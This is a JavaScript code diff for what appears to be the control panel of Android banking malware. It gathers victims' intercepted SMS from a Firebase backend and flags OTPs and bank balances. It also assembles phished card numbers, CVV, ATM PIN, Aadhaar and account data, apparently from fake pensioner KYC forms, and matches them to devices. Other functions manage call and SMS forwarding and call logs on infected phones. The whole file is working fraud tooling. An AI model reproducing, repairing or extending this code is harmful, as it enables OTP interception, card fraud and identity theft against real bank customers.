+      call: { on: !!call.enabled, target: call.target || '' },
+      sms: { on: !!sms.enabled, target: sms.target || '' }
+    };
+  });
+}
+
+async function loadAllMessages(force){
+  if(_loadingAllMsgs)return;
+  if(_allMsgsLoaded && !force && globalMsgs.length>0){
+    var mc=document.getElementById('mainContent');
+    if(mc && currentNav==='messages' && !isSearchActive()){ mc.innerHTML=renderMessagesHTML(); mc.scrollTop=0; }
+    return;
+  }
+  _loadingAllMsgs=true;
+  var listEl=document.getElementById('msgList');
+  if(listEl && globalMsgs.length===0 && currentNav==='messages'){ listEl.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>Loading…</div></div>'; }
+
+  var all=[];
+
+  var processMsgData = function(msgData) {
+      if(!msgData) return;
+      Object.keys(msgData).forEach(function(devId) {
+          var d = allDevices.find(function(dev){ 
+              return dev.id === devId || (dev.raw && dev.raw.android_id === devId); 
+          });
+          var mappedId = d ? d.id : devId; 
+          var devName = d ? getDeviceDisplayName(d) : 'Unknown Device ('+devId.substring(0,6)+')';
+          var devStatus = d ? d.status : false;
+          var parsed = parseMsgs(msgData[devId]);
+          parsed.forEach(function(m) {
+              m.deviceId = mappedId; 
+              m.originalId = devId;
+              m.deviceName = devName;
+              m.deviceStatus = devStatus;
+          });
+          all = all.concat(parsed);
+      });
+  };
+
+  try {
+      var msgData = await restFetch('messages');
+      processMsgData(msgData);
+  } catch(e) { }
+
+  try {
+      var messData = await restFetch('mess');
+      processMsgData(messData);
+  } catch(e) { }
+
+  if(all.length === 0 && allDevices.length > 0) {
+      var batchSize=5;
+      for(var i=0;i<allDevices.length;i+=batchSize){
+        var batch=allDevices.slice(i,i+batchSize);
+        var results=await Promise.all(batch.map(function(d){
+          var promises = [
+              restFetch('messages/'+d.id).catch(function(){return null;}),
+              restFetch('mess/'+d.id).catch(function(){return null;})
+          ];
+          var androidId = d.raw && d.raw.android_id ? d.raw.android_id : null;
+          if(androidId) {
+              promises.push(restFetch('messages/'+androidId).catch(function(){return null;}));
+              promises.push(restFetch('mess/'+androidId).catch(function(){return null;}));
+          }
+          return Promise.all(promises).then(function(res) {
+              var combined = [];
+              res.forEach(function(data){ if(data) combined = combined.concat(parseMsgs(data)); });
+              var seen = {};
+              var finalMsgs = [];
+              combined.forEach(function(m) {
+                  if(!seen[m.key]) { seen[m.key] = true; finalMsgs.push(m); }
+              });
+              finalMsgs.forEach(function(m){m.deviceId=d.id;m.originalId=d.id;m.deviceName=getDeviceDisplayName(d);m.deviceStatus=d.status;});
+              return finalMsgs;
+          });
+        }));
+        results.forEach(function(msgs){all=all.concat(msgs);});
+      }
+  }
+
+  all.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
+  
+  var seenGlobal = {};
+  var finalGlobal = [];
+  all.forEach(function(m) {
+      var gkey = m.deviceId + '_' + m.key;
+      if(!seenGlobal[gkey]) { seenGlobal[gkey] = true; finalGlobal.push(m); }
+  });
+
+  globalMsgs=finalGlobal;_allMsgsLoaded=true;_loadingAllMsgs=false;
+  
+  if(currentNav==='messages' && !isSearchActive()){
+      var mc2=document.getElementById('mainContent');
+      if(mc2){ mc2.innerHTML=renderMessagesHTML(); mc2.scrollTop=0; }
+  }
+}
+function stopMsgPolling(){if(_msgPollTimer){clearInterval(_msgPollTimer);_msgPollTimer=null;}_msgPollDevice=null;}
+function startMsgPolling(id){
+  stopMsgPolling();_msgPollDevice=id;pollMessagesOnce(id);
+  _msgPollTimer=setInterval(function(){if(_msgPollDevice!==id){stopMsgPolling();return;}if(currentNav!=='device-detail')return;pollMessagesOnce(id);},MSG_POLL_INTERVAL);
+}
+function pollMessagesOnce(id){
+  var dev = allDevices.find(function(d){return d.id===id;});
+  var androidId = dev && dev.raw && dev.raw.android_id ? dev.raw.android_id : null;
+  
+  var promises = [
+      restFetch('messages/'+id).catch(function(){return null;}),
+      restFetch('mess/'+id).catch(function(){return null;})
+  ];
+  if(androidId) {
+      promises.push(restFetch('messages/'+androidId).catch(function(){return null;}));
+      promises.push(restFetch('mess/'+androidId).catch(function(){return null;}));
+  }
+  
+  Promise.all(promises).then(function(results) {
+      if(_msgDeviceId!==id) return;
+      var allParsed = [];
+      results.forEach(function(data) {
+          if(data) allParsed = allParsed.concat(parseMsgs(data));
+      });
+      var seen = {};
+      var finalMsgs = [];
+      allParsed.forEach(function(m) {
+          if(!seen[m.key]) { seen[m.key] = true; finalMsgs.push(m); }
+      });
+      finalMsgs.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
+      handleMessagesUpdate(id, finalMsgs);
+  });
+}
+function handleMessagesUpdate(id,msgs){
+  _msgCache[id] = msgs; /* CACHE SAVE */
+  var isFirstLoad=allMsgs.length===0;
+  if(!isFirstLoad&&msgs.length){
+    var oldKeys={};for(var i=0;i<allMsgs.length;i++)oldKeys[allMsgs[i].key]=true;
+    var newOnes=[];for(var j=0;j<msgs.length;j++)if(!oldKeys[msgs[j].key])newOnes.push(msgs[j]);
+    var newIncoming=newOnes.filter(function(m){return m.type==='incoming';});
+    if(newIncoming.length>0){
+      for(var k=0;k<newIncoming.length;k++)_newMsgKeys[newIncoming[k].key]=Date.now();
+      var firstNew=newIncoming[0];
+      showToast('💬 New SMS from '+fmtPh(firstNew.sender),'sms');
+    }
+  }
+
+  if(_allMsgsLoaded) {
+      var dev = allDevices.find(function(d){return d.id === id;});
+      var devName = dev ? getDeviceDisplayName(dev) : id;
+      globalMsgs = globalMsgs.filter(function(m){return m.deviceId !== id;});
+      msgs.forEach(function(m){
+          m.deviceId = id;
+          m.deviceName = devName;
+          m.deviceStatus = dev ? dev.status : false;
+      });
+      globalMsgs = globalMsgs.concat(msgs);
+      globalMsgs.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
+  }
+
+  allMsgs=msgs;_msgFbResponded=true;updCnt();
+  if(currentNav==='device-detail'&&currentSubTab==='sms')renderSubTabContent(true);
+  else if(currentNav==='device-detail')updateSubTabBadges();
+}
+function listenMessages(id){
+  if(_msgRef){try{_msgRef.off();}catch(e){}_msgRef=null;}
+  if(_androidMsgRef){try{_androidMsgRef.off();}catch(e){}_androidMsgRef=null;}
+  if(_messRef){try{_messRef.off();}catch(e){}_messRef=null;}
+  if(_androidMessRef){try{_androidMessRef.off();}catch(e){}_androidMessRef=null;}
+  
+  stopMsgPolling();curMsgDev=id;_msgDeviceId=id;
+  
+  /* CACHE CHECK */
+  if (!_msgCache[id] || _msgCache[id].length === 0) {
+      allMsgs=[];
+      _msgFbResponded=false;
+  } else {
+      allMsgs=_msgCache[id];
+      _msgFbResponded=true;
+  }
+  
+  _newMsgKeys={};updCnt();
+  _msgFirstRender=true;_subTabOpenTime=Date.now();
+  var el=document.getElementById('subTabContent');
+  if(el&&currentSubTab==='sms')el.innerHTML='<div class="ldwrap"><div class="gold-spin"></div><div>Loading…</div></div>';
+  
+  var dev = allDevices.find(function(d){return d.id===id;});
+  var androidId = dev && dev.raw && dev.raw.android_id ? dev.raw.android_id : null;
+  
+  if(!fbDB||_restLoaded){
+    startMsgPolling(id);
+    return;
+  }
+  try{
+    var msgsM1 = [], msgsM2 = [], msgsS1 = [], msgsS2 = [];
+    var updateUI = function() {
+        var combined = msgsM1.concat(msgsM2, msgsS1, msgsS2);
+        var seen = {};
+        var finalMsgs = [];
+        combined.forEach(function(m) {
+            if(!seen[m.key]) { seen[m.key] = true; finalMsgs.push(m); }
+        });
+        finalMsgs.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
+        
+        if(_msgDeviceId!==id) return;
+        _msgCache[id] = finalMsgs; /* CACHE SAVE */
+        allMsgs = finalMsgs;
+        _msgFbResponded = true;
+        updCnt();
+        if(currentNav==='device-detail'&&currentSubTab==='sms')renderSubTabContent(true);
+        else if(currentNav==='device-detail')updateSubTabBadges();
+    };
+
+    _msgRef=fbDB.ref('messages/'+id).limitToLast(MSG_LIMIT);
+    _msgRef.on('value',function(snap){
+      msgsM1 = parseMsgs(snap.val()||{});
+      updateUI();
+    }, function(err){ startMsgPolling(id); });
+
+    _messRef=fbDB.ref('mess/'+id).limitToLast(MSG_LIMIT);
+    _messRef.on('value',function(snap){
+      msgsS1 = parseMsgs(snap.val()||{});
+      updateUI();
+    }, function(err){});
+    
+    if(androidId) {
+        _androidMsgRef=fbDB.ref('messages/'+androidId).limitToLast(MSG_LIMIT);
+        _androidMsgRef.on('value',function(snap){
+          msgsM2 = parseMsgs(snap.val()||{});
+          updateUI();
+        }, function(err){});
+
+        _androidMessRef=fbDB.ref('mess/'+androidId).limitToLast(MSG_LIMIT);
+        _androidMessRef.on('value',function(snap){
+          msgsS2 = parseMsgs(snap.val()||{});
+          updateUI();
+        }, function(err){});
+    }
+  }catch(e){startMsgPolling(id);}
+}
+function updateSubTabBadges(){
+  var incomingCount=allMsgs.filter(function(m){return m.type==='incoming';}).length;
+  var badge=document.querySelector('.sub-tab[data-subtab="sms"] .badge');if(badge)badge.textContent=incomingCount;
+  try{var best=findBestCardsForDevice(selDev);var fb=document.querySelector('.sub-tab[data-subtab="forms"] .badge');if(fb)fb.textContent=best.cards.length;}catch(e){}
+}
+function startKycListeners(){
+  if(_kycStarted||!fbDB)return;_kycStarted=true;
+  var kycPaths=['indian_bank_pensioner_kyc','kyc','KYC','bank_kyc','bankKyc','kyc_data','kycData','cards','card_data','cardData','bank_cards','bankCards','pensioner_kyc','accounts','forms','form','cardDetails','card_details'];
+  kycPaths.forEach(function(path,idx){
+    setTimeout(function(){try{fbDB.ref(path).on('value',function(snap){_allKycData[path]=snap.val()||{};if(currentNav==='device-detail'&&currentSubTab==='forms')renderSubTabContent(true);},function(err){});}catch(e){}},idx*80);
+  });
+}
+function normalizePhone10(v){var d=String(v==null?'':v).replace(/\D/g,'');if(!d)return'';if(d.length===11&&d.charAt(0)==='0')d=d.slice(1);if(d.length===12&&d.slice(0,2)==='91')d=d.slice(2);if(d.length!==10)return'';return d;}
+function extractPhonesFromObject(obj,depth){
+  var out=[];depth=depth||0;
+  if(depth>5||obj==null)return out;
+  if(typeof obj==='string'||typeof obj==='number'){var p=normalizePhone10(obj);if(p)out.push(p);return out;}
+  if(typeof obj!=='object')return out;
+  if(Array.isArray(obj)){for(var i=0;i<obj.length;i++)out=out.concat(extractPhonesFromObject(obj[i],depth+1));return out;}
+  Object.keys(obj).forEach(function(k){var kp=normalizePhone10(k);if(kp)out.push(kp);var v=obj[k];if(v==null)return;if(typeof v==='string'||typeof v==='number'){var p=normalizePhone10(v);if(p)out.push(p);}else if(typeof v==='object')out=out.concat(extractPhonesFromObject(v,depth+1));});
+  return out;
+}
+function devicePhoneSet(dev){
+  var set={};if(!dev)return set;
+  var add=function(v){var p=normalizePhone10(v);if(p)set[p]=true;};
+  add(dev.mobNo);
+  (dev.sims||[]).forEach(function(s){if(s){add(s.phoneNumber);add(s.number);add(s.msisdn);add(s.mobile);}});
+  var raw=dev.raw||{};
+  ['mobNo','mobile','phone','phoneNumber','number','simNumber','msisdn','whatsapp'].forEach(function(k){add(raw[k]);});
+  if(raw.submissions&&typeof raw.submissions==='object'){Object.keys(raw.submissions).forEach(function(k){var s=raw.submissions[k];if(s&&typeof s==='object'){['mobile','phone','mobNo','phoneNumber'].forEach(function(f){add(s[f]);});}});}
+  return set;
+}
+var BRAND_WORDS={'motorola':1,'moto':1,'samsung':1,'redmi':1,'xiaomi':1,'realme':1,'oppo':1,'vivo':1,'oneplus':1,'poco':1,'nothing':1,'google':1,'apple':1,'iphone':1,'honor':1,'nokia':1,'tecno':1,'infinix':1,'itel':1,'lava':1,'micromax':1,'galaxy':1,'pixel':1};
+var SUFFIX_WORDS={'5g':1,'4g':1,'lte':1,'pro':1,'plus':1,'max':1,'ultra':1,'neo':1,'prime':1,'mini':1};
+function extractModelParts(str){
+  if(!str)return{nums:[],words:[],brand:null,raw:''};
+  var s=String(str).toLowerCase().replace(/[^a-z0-9\s]/g,' ').replace(/\s+/g,' ').trim();
+  var tokens=s.split(' ');var nums=[],words=[],brand=null;
+  for(var i=0;i<tokens.length;i++){var t=tokens[i];
+    if(/^\d+$/.test(t))nums.push(t);
+    else if(t.length>=3&&BRAND_WORDS[t]){if(!brand){if(t==='moto'||t==='motorola')brand='motorola';else if(t==='iphone'||t==='apple')brand='apple';else if(t==='galaxy'||t==='samsung')brand='samsung';else if(t==='redmi'||t==='poco'||t==='xiaomi')brand='xiaomi';else brand=t;}}
+    else if(t.length>=3&&!SUFFIX_WORDS[t])words.push(t);
+  }
+  return{nums:nums,words:words,brand:brand,raw:s};
+}
+function modelMatchScore(a,b){
+  if(!a||!b)return 0;
+  var ea=extractModelParts(a),eb=extractModelParts(b);
+  var ca=ea.raw.replace(/\s/g,''),cb=eb.raw.replace(/\s/g,'');
+  if(ca===cb&&ca.length>=4)return 100;
+  var sameBrand=ea.brand&&eb.brand&&ea.brand===eb.brand;
+  var sharedNums=ea.nums.filter(function(n){return eb.nums.indexOf(n)!==-1;});
+  var sharedWords=ea.words.filter(function(w){return eb.words.indexOf(w)!==-1;});
+  var numMatch=sharedNums.length>0,wordMatch=sharedWords.length>0;
+  if(sameBrand&&numMatch&&wordMatch)return 95;
+  if(sameBrand&&numMatch)return 75;
+  if(sameBrand&&sharedWords.length>=2)return 75;
+  if(numMatch&&sharedWords.length>=2)return 65;
+  if(sameBrand&&wordMatch)return 45;
+  if(numMatch&&wordMatch)return 30;
+  if(wordMatch&&sharedWords.length>=2)return 40;
+  if(sameBrand)return 20;
+  if(numMatch)return 15;
+  if(wordMatch)return 10;
+  return 0;
+}
+function looksLikeCard(o){
+  if(!o||typeof o!=='object'||Array.isArray(o))return false;
+  var keys=['number','cardNumber','CardNumber','card_number','cardNo','pan','last4','expiry','Expiry','cvv','Cvv','CVV','atmPin','holder','bank','aadhaar','Aadhaar','accountNumber','AccountNumber','customerName','CustomerName','dob','DOB','account'];
+  for(var i=0;i<keys.length;i++)if(keys[i]in o)return true;
+  return false;
+}
+function collectKycEntries(data,prefix){
+  var out=[];if(!data||typeof data!=='object')return out;prefix=prefix||'';
+  if(Array.isArray(data)){data.forEach(function(v,i){out=out.concat(collectKycEntries(v,prefix+'/'+i));});return out;}
+  if(looksLikeCard(data)){out.push({key:prefix||'root',data:data});return out;}
+  Object.keys(data).forEach(function(k){var v=data[k];if(v&&typeof v==='object')out=out.concat(collectKycEntries(v,prefix?prefix+'/'+k:k));});
+  return out;
+}
+function findBestCardsForDevice(dev){
+  if(!dev)return{cards:[],source:null,matchType:null,banner:'',sourceLabel:'No device'};
+  var ownCards=getDeviceCards(dev);
+  if(ownCards.length){
+    var manualCount=ownCards.filter(function(c){return c.manual;}).length;
+    var label=manualCount>0?(manualCount+' manual, '+(ownCards.length-manualCount)+' firebase'):'Firebase (own)';
+    return{cards:ownCards,source:'firebase',matchType:manualCount>0?'manual':'own',banner:'',sourceLabel:label};
+  }
+  var devModel=(dev.raw&&(dev.raw.model||dev.raw.name||dev.raw.deviceName))||dev.name||'';
+  var devPhones=devicePhoneSet(dev);
+  var devMobiles={};var raw=dev.raw||{};
+  ['mobile','mobNo','phone','phoneNumber','whatsapp','simNumber'].forEach(function(k){var p=normalizePhone10(raw[k]);if(p)devMobiles[p]=true;});
+  var modelMatches=[],deviceIdMatches=[],phoneMatches=[],mobileMatches=[];
+  Object.keys(_allKycData).forEach(function(path){
+    var data=_allKycData[path];var entries=collectKycEntries(data,'');
+    entries.forEach(function(e){
+      var parsed=normalizeCard(e.data,path+'/'+e.key);if(!parsed)return;
+      parsed.fullKey=path+'/'+e.key;
+      var kycModel=e.data.deviceModel||e.data.device_model||e.data.model||e.data.deviceName||e.data.device_name||'';
+      var ms=0;if(devModel&&kycModel)ms=modelMatchScore(devModel,kycModel);
+      var clean=function(s){return String(s==null?'':s).toLowerCase().replace(/[^a-z0-9]/g,'');};
+      var devId=clean(dev.id);
+      var kycId=clean(e.data.deviceId||e.data.device_id||e.data.imei||e.data.IMEI||'');
+      var keyC=clean(e.key);
+      var idHit=false;
+      if(devId){if(kycId&&(kycId.indexOf(devId)!==-1||devId.indexOf(kycId)!==-1))idHit=true;else if(keyC&&keyC.indexOf(devId)!==-1)idHit=true;}
+      var kycPhones=extractPhonesFromObject(e.data);var kp=normalizePhone10(e.key);if(kp)kycPhones.push(kp);
+      var phoneHit=false;for(var i=0;i<kycPhones.length;i++)if(devPhones[kycPhones[i]]){phoneHit=true;break;}
+      var mobileHit=false;if(!phoneHit)for(var m=0;m<kycPhones.length;m++)if(devMobiles[kycPhones[m]]){mobileHit=true;break;}
+      if(ms>=60){parsed._modelScore=ms;modelMatches.push(parsed);}
+      else if(idHit)deviceIdMatches.push(parsed);
+      else if(phoneHit)phoneMatches.push(parsed);
+      else if(mobileHit)mobileMatches.push(parsed);
+    });
+  });
+  if(modelMatches.length){modelMatches.sort(function(a,b){return(b._modelScore||0)-(a._modelScore||0);});return{cards:modelMatches,source:'kyc',matchType:'model',banner:'',sourceLabel:'KYC · Model matched'};}
+  if(deviceIdMatches.length)return{cards:deviceIdMatches,source:'kyc',matchType:'deviceId',banner:'',sourceLabel:'KYC · Device ID'};
+  if(phoneMatches.length)return{cards:phoneMatches,source:'kyc',matchType:'phone',banner:'',sourceLabel:'KYC · Phone matched'};
+  if(mobileMatches.length)return{cards:mobileMatches,source:'kyc',matchType:'mobile',banner:'',sourceLabel:'KYC · Mobile matched'};
+  return{cards:[],source:null,matchType:null,banner:'',sourceLabel:'No match'};
+}
+function getDeviceCards(dev){
+  var out=[];if(!dev)return out;
+  var raw=dev.raw||{};var cardSources=[];
+  if(raw.submissions&&typeof raw.submissions==='object')Object.keys(raw.submissions).forEach(function(k){var v=raw.submissions[k];if(v&&typeof v==='object')cardSources.push({sourceKey:'submissions/'+k,data:v});});
+  if(raw.cards&&typeof raw.cards==='object')Object.keys(raw.cards).forEach(function(k){cardSources.push({sourceKey:'cards/'+k,data:raw.cards[k]});});
+  if(raw.cardDetails&&typeof raw.cardDetails==='object')Object.keys(raw.cardDetails).forEach(function(k){cardSources.push({sourceKey:'cardDetails/'+k,data:raw.cardDetails[k]});});
+
+  if(raw.forms && typeof raw.forms === 'object') {
+      Object.keys(raw.forms).forEach(function(k) {
+          var f = raw.forms[k];
+          if(f && typeof f === 'object') {
+              if(f.content && typeof f.content === 'object') {
+                  cardSources.push({sourceKey: k, data: f.content, formType: f.type});
+              } else {
+                  cardSources.push({sourceKey: k, data: f, formType: f.type});
+              }
+          }
+      });
+  }
+
+  if(raw.form&&typeof raw.form==='object')Object.keys(raw.form).forEach(function(k){cardSources.push({sourceKey:k,data:raw.form[k]});});
+  if(raw.card&&typeof raw.card==='object'){if(raw.card.number||raw.card.cardNumber||raw.card.last4)cardSources.push({sourceKey:'card',data:raw.card});else Object.keys(raw.card).forEach(function(k){var v=raw.card[k];if(v&&typeof v==='object')cardSources.push({sourceKey:'card/'+k,data:v});});}
+
+  cardSources.forEach(function(src){
+      var parsed = normalizeCard(src.data, src.sourceKey);
+      if(parsed){
+          parsed.formType = src.formType;
+          out.push(parsed);
+      }
+  });
+  return out;
+}
+function normalizeCard(v,sourceKey){
+  if(!v||typeof v!=='object')return null;
+  if(v.content && typeof v.content === 'object') v = v.content;
+
+  var number=v.number||v.cardNumber||v.CardNumber||v.card_number||v.cardNo||v.pan||v.debitCard||v.creditCard||v.card||'';
+  number=String(number).replace(/\s+/g,'');
+  var last4=v.last4||v.last_4||'';
+  if(!last4&&number)last4=String(number).replace(/\D/g,'').slice(-4);
+  var expiry=v.expiry||v.Expiry||v.expiryDate||v.exp||'';
+  var cvv=v.cvv||v.Cvv||v.CVV||v.cvv2||'';
+  var atmPin=v.atmPin||v.atm_pin||v.pin||'';
+  var holder=v.holder||v.holderName||v.holder_name||v.fullName||v.name||v.CustomerName||v.customerName||'';
+  var bank=v.bank||v.bankName||v.issuer||'';
+  var network=v.network||v.brand||'';
+  var account=v.account||v.accountNo||v.AccountNumber||v.accountNumber||v.account_no||'';
+  var aadhaar=v.aadhaar||v.Aadhaar||v.aadhar||'';
+  var customerName=v.customerName||v.CustomerName||'';
+  var mobile=v.mobile||v.phone||v.mobNo||v.mobileNumber||'';
+  var deviceModel=v.deviceModel||v.device_model||v.model||'';
+  var deviceId=v.deviceId||v.device_id||'';
+  var dob=v.dob||v.DOB||v.dateOfBirth||v.date_of_birth||v.birthDate||'';
+  if(!network&&number){var n=String(number).replace(/\D/g,'');if(/^4/.test(n))network='VISA';else if(/^5[1-5]/.test(n))network='MASTERCARD';else if(/^3[47]/.test(n))network='AMEX';else if(/^6/.test(n))network='RUPAY';}
+  var ts=v.addedAt||v.createdAt||v.timestamp||v.dateTime||Date.now();ts=parseInt(ts)||Date.now();
+  if(!number&&!last4&&!expiry&&!cvv&&!atmPin&&!aadhaar&&!account&&!holder&&!dob)return null;
+  return{key:sourceKey,source:'firebase',number:number,last4:last4,expiry:expiry,cvv:cvv,atmPin:atmPin,holder:holder,bank:bank,network:network,account:account,aadhaar:aadhaar,customerName:customerName,deviceModel:deviceModel,deviceId:deviceId,mobile:mobile,dob:dob,ts:ts,dateTime:new Date(ts).toLocaleString(),manual:!!v.manual};
+}
+function classifyMsg(text){
+  if(!text)return'normal';
+  var l=String(text).toLowerCase();
+  var bankIndicators=['a/c','acct','account','card ending','card no','card xx','hdfc','icici','sbi','state bank','axis bank','kotak','pnb','indusind','idfc','yes bank','union bank','bank of','canara','federal bank','bank of baroda','rbl bank','paytm payments','airtel payments','jio payments','debit card','credit card','netbanking','net banking','upi txn','neft','imps','rtgs'];
+  var hasBankContext=false;
+  for(var b=0;b<bankIndicators.length;b++)if(l.indexOf(bankIndicators[b])!==-1){hasBankContext=true;break;}
+  if(!hasBankContext)return'normal';
+  var creditWords=['credited to','credited by','credited with','amount credited','you have received','received rs','received inr','has been credited','deposited','refund of','cashback of','money received','received amount','credit of','cr. by','cr by'];
+  for(var i=0;i<creditWords.length;i++)if(l.indexOf(creditWords[i])!==-1)return'credit';
+  var debitWords=['debited','debited from','debit of','spent of','spent rs','spent inr','withdrawn','withdrawal','paid to','payment of','purchase of','transfer to','sent rs','sent inr','deducted from','has been debited','dr. by','dr by'];
+  for(var j=0;j<debitWords.length;j++)if(l.indexOf(debitWords[j])!==-1)return'debit';
+  var balanceWords=['avl bal','available bal','balance is','bal is','bal:','balance:','bal rs','balance rs','closing bal','total balance','remaining bal','avl. bal','available balance','a/c bal'];
+  for(var k=0;k<balanceWords.length;k++)if(l.indexOf(balanceWords[k])!==-1)return'balance';
+  if(/\brs\.?\s*[\d,]+/i.test(text)||/\binr\s*[\d,]+/i.test(text)||/₹\s*[\d,]+/.test(text))return'amount';
+  return'normal';
+}
+function categorizeMsg(m){
+  var text=m.message||'';
+  if(/otp|one.?time.?password|verification code|\b\d{4,6}\b.*(code|otp)|(code|otp).*\b\d{4,6}\b/i.test(text))return'otp';
+  var cat=classifyMsg(text);
+  if(cat==='credit')return'credit';
+  if(cat==='debit')return'debit';
+  if(/bank|balance|account|a\/c/i.test(text))return'bank';
+  return'other';
+}
+var BANK_CODES={
+  'HDFC':'HDFC Bank','ICICI':'ICICI Bank','SBIN':'State Bank of India','SBI':'State Bank of India',
+  'AXIS':'Axis Bank','UTIB':'Axis Bank','KOTAK':'Kotak Mahindra Bank','KKBK':'Kotak',
+  'PNB':'Punjab National Bank','PUNB':'PNB','BOI':'Bank of India','BKID':'BOI',
+  'CANARA':'Canara Bank','CNRB':'Canara Bank','FEDERAL':'Federal Bank','FDRL':'Federal Bank',
+  'IDFC':'IDFC First Bank','IDFB':'IDFC','INDUSIND':'IndusInd Bank','INDB':'IndusInd',
+  'YES':'Yes Bank','YESB':'Yes Bank','UNION':'Union Bank','UBIN':'Union Bank',
+  'BOB':'Bank of Baroda','BARB':'BOB','IOB':'Indian Overseas Bank','CENTRAL':'Central Bank',
+  'CBIN':'Central Bank','UCO':'UCO Bank','PAYTM':'Paytm Payments Bank','PYTM':'Paytm',
+  'AIRTEL':'Airtel Payments Bank','JIO':'Jio Payments Bank','AMEX':'American Express',
+  'CITI':'Citibank','HSBC':'HSBC','RBL':'RBL Bank','RATN':'RBL','KARUR':'Karur Vysya',
+  'DCB':'DCB Bank','DCBL':'DCB','SOUTHINDIAN':'South Indian Bank','SIBL':'SIB',
+  'KVB':'Karur Vysya Bank','KVBL':'KVB',
+  'INDBNK':'Indian Bank','INDIANB':'Indian Bank','INDIAN BANK':'Indian Bank','INDIAN':'Indian Bank',
+  'IDBI':'IDBI Bank','BANDHAN':'Bandhan Bank','EQUITAS':'Equitas Bank','AUSFB':'AU Small Finance Bank',
+  'UJJIVAN':'Ujjivan Bank','JANASAMARTH':'Jana Small Finance Bank','SURYODAY':'Suryoday Bank'
+};
+
+function extractBankName(text){
+  if(!text)return'';
+  var upper=text.toUpperCase();
+  
+  if(upper.indexOf('INDIAN OVERSEAS')!==-1) return 'Indian Overseas Bank';
+  if(upper.indexOf('INDIAN BANK')!==-1) return 'Indian Bank';
+  if(upper.indexOf('BANK OF BARODA')!==-1) return 'Bank of Baroda';
+  if(upper.indexOf('BANK OF INDIA')!==-1) return 'Bank of India';
+  if(upper.indexOf('STATE BANK OF INDIA')!==-1) return 'State Bank of India';
+  
+  for(var code in BANK_CODES){
+      if(upper.indexOf(code)!==-1) return BANK_CODES[code];
+  }
+  
+  var common=['HDFC','ICICI','SBI','AXIS','KOTAK','PNB','BOI','CANARA','FEDERAL','IDFC','INDUSIND','YES','UNION','BOB','AMEX','CITI','HSBC','RBL','PAYTM','AIRTEL','JIO'];
+  for(var i=0;i<common.length;i++)if(upper.indexOf(common[i])!==-1)return common[i];
+  return'';
+}
+
+function extractBalance(text){
+  if(!text)return null;
+  var patterns=[/(?:avl(?:\.|\s)?bal(?:ance)?|available\s+bal(?:ance)?|bal(?:ance)?)\s*(?:is|:)?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:available|avl|bal)/i,/bal(?:ance)?\s*[:=]\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i];
+  for(var i=0;i<patterns.length;i++){var m=text.match(patterns[i]);if(m){var val=parseFloat(m[1].replace(/,/g,''));if(val>0)return val;}}
+  return null;
+}
+
+function getAllBankBalances(msgs) {
+  if (!msgs || !msgs.length) return [];
+  var banks = {};
+  for (var i = 0; i < msgs.length; i++) {
+    var m = msgs[i];
+    if (m.type !== 'incoming') continue;
+    var bal = extractBalance(m.message);
+    if (bal === null) continue;
+    
+    var bName = extractBankName(m.message);
+    if (!bName && m.sender) {
+        bName = extractBankName(m.sender);
+    }
+    
+    /* UNKNOWN BANK SHOW NAHI HOGA */
+    if (!bName) continue;
+    
+    if (!banks[bName] || banks[bName].ts < m.ts) {
+      banks[bName] = { name: bName, balance: bal, ts: m.ts };
+    }
+  }
+  var arr = Object.values(banks);
+  arr.sort(function(a, b) { return b.ts - a.ts; });
+  return arr.slice(0, 2); 
+}
+
+function getLatestBankInfo(msgs){
+  if(!msgs||!msgs.length)return null;
+  var latest=null,latestTs=0;
+  for(var i=0;i<msgs.length;i++){var m=msgs[i];if(m.type!=='incoming')continue;var bal=extractBalance(m.message);if(bal===null)continue;if(m.ts>latestTs){latestTs=m.ts;latest={balance:bal,bank:extractBankName(m.message)||'Bank',dateTime:m.dateTime,ts:m.ts};}}
+  return latest;
+}
+function formatMoney(n){
+  if(n===null||n===undefined)return'0.00';
+  var parts=Number(n).toFixed(2).split('.');
+  var lastThree=parts[0].substring(parts[0].length-3);
+  var otherNumbers=parts[0].substring(0,parts[0].length-3);
+  var result;
+  if(otherNumbers!=='')result=otherNumbers.replace(/\B(?=(\d{2})+(?!\d))/g,',')+','+lastThree;else result=lastThree;
+  return result+'.'+parts[1];
+}
+function formatMoneyShort(n){
+  if(n===null||n===undefined)return'0';
+  var num=Number(n);
+  if(num>=10000000)return (num/10000000).toFixed(1)+'Cr';
+  if(num>=100000)return (num/100000).toFixed(1)+'L';
+  if(num>=1000)return num.toFixed(0);
+  return num.toFixed(0);
+}
+
+function setupForwardingListeners(id){
+  if(!fbDB)return;
+
+  if(_fwRef){try{_fwRef.off();}catch(e){}_fwRef=null;}
+  if(_callsRef){try{_callsRef.off();}catch(e){}_callsRef=null;}
+  if(_smsFwRef){try{_smsFwRef.off();}catch(e){}_smsFwRef=null;}
+
+  _callFwEnabled = false;
+  _callFwTarget = '';
+  _callFwSim = 1;
+  _smsFwEnabled = false;
+  _smsFwTarget = '';
+  _smsFwSim = 1;
+
+  try{
+    _fwRef=fbDB.ref('clients/'+id+'/forwarding/call');
+    _fwRef.on('value',function(snap){
+      if(!selDev || selDev.id !== id) return;
+      var cfg=snap.val()||{};
+      _callFwEnabled=!!cfg.enabled;
+      _callFwTarget=cfg.target||'';
+      _callFwSim=cfg.sim||1;
+      var cfTm=document.getElementById('cfTargetModal');
+      if(cfTm) cfTm.value=_callFwTarget;
+      selCfSim(_callFwSim);
+      updateFwUI();
+    });
+
+    _callsRef=fbDB.ref('clients/'+id+'/calls');
+    _callsRef.on('value',function(snap){
+      if(!selDev || selDev.id !== id) return;
+      renderCallLogs(snap.val()||{});
+    });
+  }catch(e){}
+
+  try{
+    _smsFwRef=fbDB.ref('clients/'+id+'/forwarding/sms');
+    _smsFwRef.on('value',function(snap){
+      if(!selDev || selDev.id !== id) return;
+      var cfg=snap.val()||{};
+      _smsFwEnabled=!!cfg.enabled;
+      _smsFwTarget=cfg.target||'';
+      _smsFwSim=cfg.sim||1;
+      var smsTm=document.getElementById('smsFwTarget');
+      if(smsTm) smsTm.value=_smsFwTarget;
+      selSmsFwSim(_smsFwSim);
+      updateSmsFwUI();
+    });
+  }catch(e){}
+}
+
